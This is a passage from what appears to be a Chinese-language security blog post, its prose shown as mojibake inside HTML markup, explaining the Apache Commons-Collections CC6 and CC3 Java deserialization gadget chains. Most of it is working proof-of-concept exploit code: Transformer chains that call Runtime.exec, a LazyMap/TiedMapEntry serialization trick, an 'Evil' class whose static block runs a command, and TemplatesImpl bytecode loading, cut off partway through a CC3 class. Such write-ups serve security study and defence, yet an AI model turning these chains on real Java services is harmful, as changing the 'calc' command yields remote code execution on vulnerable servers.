class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">// fake_payload</span><br>Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>    <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// putçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡ŒhashCodeï¼Œä¸ºäº†é˜²æ­¢æœ¬åœ°è°ƒè¯•è§¦å‘payloadï¼Œè¿™é‡Œæ”¾å…¥fake_payload</span><br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br><span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(expMap);<br>oos.close();<br><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ˜¯æ²¡åŠæ³•ç›´æ¥ååºåˆ—åŒ–çš„ã€‚</p><p>å½“æˆ‘ä»¬æ‰§è¡Œ<code>Map.put()</code>çš„æ—¶å€™ä¼šè§¦å‘<code>hash()</code>ï¼Œè¿›è€Œç‰µåŠ¨æ•´æ¡é“¾ã€‚</p><p>å†æ¥çœ‹<code>LazyMap</code>çš„<code>get()</code>ï¼Œç”±äºæ˜¯æ‡’åŠ è½½å› æ­¤å¾—åˆ°å½“å‰mapä¸­æ²¡æœ‰keyï¼Œæ‰ä¼šæ»¡è¶³é‚£ä¸ªifæ¡ä»¶å†è°ƒç”¨åˆ°<code>factory.transform(key)</code>ç”Ÿæˆvalueï¼Œå†<code>map.put(key, value)</code>ï¼Œè¿™æ—¶å€™<code>lazyMap</code>ä¸­å°±æœ‰keyäº†ã€‚ï¼ˆè¿™é‡Œçš„keyæ˜¯<code>new TiedMapEntry</code>ä¼ å…¥çš„keyï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap#get</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªé”®å€¼å¯¹ä»<code>LazyMap</code>ä¸­ç§»é™¤å°±è¡Œï¼Œå³<code>lazyMap.remove(&quot;test&quot;);</code></p><p>Final CC6-POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728211545706.png" alt="image-20240728211545706"></p><p>åˆ’æ—¶ä»£çš„æ„ä¹‰ã€‚</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC4æ¶‰åŠåˆ°æ›´æ–°çš„Commons-Collections4ï¼Œæ‰€ä»¥ç•™åˆ°åé¢è®²ï¼Œè€ŒCC3åŒæ ·å…·æœ‰åˆ’æ—¶ä»£çš„æ„ä¹‰ï¼Œå› ä¸ºå®ƒçš„é€»è¾‘ç”¨åˆ°çš„æ˜¯æ¶æ„å­—èŠ‚ç ï¼Œè¿™å¯¹äºJavaååºåˆ—åŒ–æ¥è¯´æ˜¯ä¸ªå¾ˆå¸¸è§çš„Attackæ–¹å¼ã€‚</p><p>é¦–å…ˆéœ€è¦ä»‹ç»çš„æ˜¯JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„ä¸œè¥¿ã€‚</p><p>ä½ å¯èƒ½ä¼šçœ‹åˆ°å¾ˆå¤šæ¬¡ <code>Gadgets.createTemplatesImpl(command)</code> ï¼Œå¦å¤–ä½ ä¹Ÿè®¸æ›¾åœ¨<code>fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨ä¸­çœ‹åˆ°è¿‡<code>TemplatesImpl</code>è¿™ä¸ªç±»ï¼Œå®ƒç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œä¸ºä½•å‡ºé•œç‡è¿™ä¹ˆé«˜å‘¢ï¼Ÿ</p><p>å­—èŠ‚ç æ˜¯ä»€ä¹ˆå°±ä¸åšè¿‡å¤šè¯´æ˜ï¼Œè¿™ä¸Javaä½œä¸ºé™æ€è¯­è¨€è€Œä¸”èƒ½å¤Ÿâ€œä¸€æ¬¡ç¼–è¯‘ï¼Œåˆ°å¤„è¿è¡Œâ€çš„å®—æ—¨æœ‰å…³ã€‚</p><p>åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ä¹Ÿå¾ˆå¤šï¼Œè¿™é‡Œå…ˆä¸ä»‹ç»äº†ï¼Œåé¢ä¼šå•å¼€ä¸€ç« æ¥è®²è®²ã€‚</p><p>è¨€å½’æ­£ä¼ ï¼ŒCC3è¿™é‡Œçš„èƒŒæ™¯æ˜¯ä¸€ä¸ªQuestionï¼ŒCC1å’ŒCC6çš„sinkéƒ½åœ¨<code>InvokerTransformer</code>ä¸Šï¼Œè‹¥WAFç›´æ¥ç¦ç”¨äº†è¯¥ç±»ï¼Œæ˜¯å¦å°±æ‹¿å®ƒæ²¡æ³•äº†ï¼Ÿ</p><p>å½“ç„¶ä¸æ˜¯ã€‚ä½†è¿™é‡Œå°±åˆè¦è¯·å‡ºå¦ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<br></code></pre></td></tr></table></figure><p><strong>â€œæˆ‘æ‰“å®¿å‚©ï¼ŸçœŸçš„å‡çš„ï¼Ÿâ€</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ª<code>TrAXFilter</code>ã€‚</p><p>è¯¥ç±»æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†<code>(TransformerImpl) templates.newTransformer()</code></p><p><code>TransformerImpl</code>åœ¨åŠ è½½å­—èŠ‚ç çš„å¾ˆå¤šæ–‡ç« é‚£é‡Œæè¿‡ï¼Œ<code>newTransformer</code>æœ€åèƒ½è°ƒç”¨åˆ°<code>defineClass()</code>åŠ è½½æ¶æ„å­—èŠ‚ç ã€‚</p><p>ä½†æ˜¯ç›®å‰çœ‹æ¥å¦‚æœæ²¡æœ‰<code>InvokerTransfomer</code>ï¼Œ<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ä¹Ÿæ— æ³•è°ƒç”¨</p><p>è¿™é‡Œè¦ç”¨åˆ°æ–°çš„<code>Transformer</code>å®ç°ç±»<code>InstantiateTransformer</code>ï¼Œçœ‹çœ‹å®ƒçš„<code>transform</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è°ƒç”¨æ„é€ å‡½æ•°ï¼Œè¿”å›ç±»å®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>    <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>    <span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>ChainedTransformer#transform()<br>InstantiateTransformer#transform()<br>    TrAXFilter#TrAXFilter()<br>TemplatesImpl#newTransformer()<br>TemplatesImpl#getTransletInstance()<br>TemplatesImpl#defineTransletClasses()<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨åˆ°<code>javassist</code>æ¥è·å–å­—èŠ‚ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Evil.class</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>demo</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">argMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">evilMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(argMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>    evilMap.put(<span class="hljs-string">&quot;xxx&quot;</span>, <span class="hljs-string">&quot;yyy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŠŠCC6æ”¹é€ ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC3ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span 